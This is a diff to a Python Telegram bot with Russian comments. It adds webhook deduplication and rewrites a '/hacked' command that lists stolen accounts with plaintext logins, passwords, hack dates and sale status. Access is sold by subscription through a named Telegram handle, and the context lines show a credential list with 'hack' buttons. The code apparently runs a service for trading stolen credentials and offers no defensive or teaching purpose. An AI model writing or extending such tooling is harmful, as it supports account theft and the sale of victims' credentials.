@@ -364,6 +364,9 @@ def submit():
 def not_found():
     return render_template('404.html')
 
+# Добавим глобальное хранилище обработанных update_id
+processed_updates = set()
+
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
@@ -372,6 +375,11 @@ def webhook():
             print(f"Получены данные вебхука: {json_string}")
             update = telebot.types.Update.de_json(json_string)
             if update and (update.message or update.callback_query):
+                update_id = update.update_id
+                if update_id in processed_updates:
+                    print(f"Повторный update_id: {update_id}, пропускаем")
+                    return 'OK', 200
+                processed_updates.add(update_id)
                 print(f"Обработка обновления: {update}")
                 bot.process_new_updates([update])
                 print("Обновление успешно обработано")
@@ -383,7 +391,67 @@ def webhook():
             return 'Неверный запрос', 400
     except Exception as e:
         print(f"Ошибка в вебхуке: {e}")
-        return 'Ошибка сервера', 500
+        return 'OK', 200  # Всегда 200 для Telegram
+
+# Обновленная команда /hacked для пользователей
+@bot.message_handler(commands=['hacked'])
+def hacked_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Обработка /hacked для chat_id: {chat_id}")
+    access = check_access(chat_id, 'hacked')
+    if access:
+        # Если доступ ограничен, показываем сообщение об ошибке
+        bot.reply_to(message, access)
+        return
+    
+    hacked_accounts = get_hacked_accounts()
+    if not hacked_accounts:
+        markup = types.InlineKeyboardMarkup()
+        if get_user(chat_id)['prefix'] == 'Создатель':  # Только Создатель может добавлять
+            markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
+        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.", reply_markup=markup)
+        return
+    
+    response = "🔓 Взломанные аккаунты:\n"
+    markup = types.InlineKeyboardMarkup()
+    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
+        formatted_time = format_time_with_minutes(hack_date)
+        response += (f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | "
+                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
+        if get_user(chat_id)['prefix'] == 'Создатель':  # Только Создатель может удалять
+            markup.add(
+                types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
+            )
+    if get_user(chat_id)['prefix'] == 'Создатель':
+        markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
+    bot.reply_to(message, response, reply_markup=markup)
+
+# Обновим check_access для /hacked
+def check_access(chat_id, command):
+    global tech_break
+    print(f"Проверка доступа для {chat_id} на команду {command}")
+    user = get_user(chat_id)
+    if user is None and command in ['start', 'menu', 'getchatid']:
+        save_user(chat_id, "Посетитель")
+        user = get_user(chat_id)
+    
+    if tech_break and chat_id != ADMIN_CHAT_ID:
+        time_left = (tech_break - get_current_time()).total_seconds() / 60
+        if time_left > 0:
+            return f"⏳ Сейчас идет техперерыв. Окончание через {int(time_left)} минут."
+    if not user or user['prefix'] == 'Посетитель':
+        if command in ['start', 'menu', 'getchatid']:
+            return None
+        return "🔒 Вы можете купить подписку у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
+    if user['subscription_end'] and user['subscription_end'] < get_current_time():
+        save_user(chat_id, 'Посетитель', get_current_time())
+        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
+    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
+        return "🔒 Доступно только для Админа и Создателя!"
+    if command in ['database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
+        return "🔒 Доступно только для Создателя!"
+    print(f"Доступ разрешен для {chat_id} на {command}")
+    return None
 
 
 # === Команды бота ===
@@ -517,32 +585,6 @@ def passwords_cmd(message):
             types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_cred_{login}"),
             types.InlineKeyboardButton(f"Взломать {login}", callback_data=f"hack_cred_{login}")
         )
-    bot.reply_to(message, response, reply_markup=markup)
-
-@bot.message_handler(commands=['hacked'])
-def hacked_cmd(message):
-    chat_id = str(message.chat.id)
-    print(f"Обработка /hacked для chat_id: {chat_id}")
-    access = check_access(chat_id, 'hacked')
-    if access:
-        bot.reply_to(message, access)
-        return
-    hacked_accounts = get_hacked_accounts()
-    if not hacked_accounts:
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
-        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.", reply_markup=markup)
-        return
-    response = "🔓 Взломанные аккаунты:\n"
-    markup = types.InlineKeyboardMarkup()
-    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
-        formatted_time = format_time_with_minutes(hack_date)
-        response += (f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | "
-                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
-        markup.add(
-            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
-        )
-    markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
     bot.reply_to(message, response, reply_markup=markup)
 
 @bot.message_handler(commands=['database'])
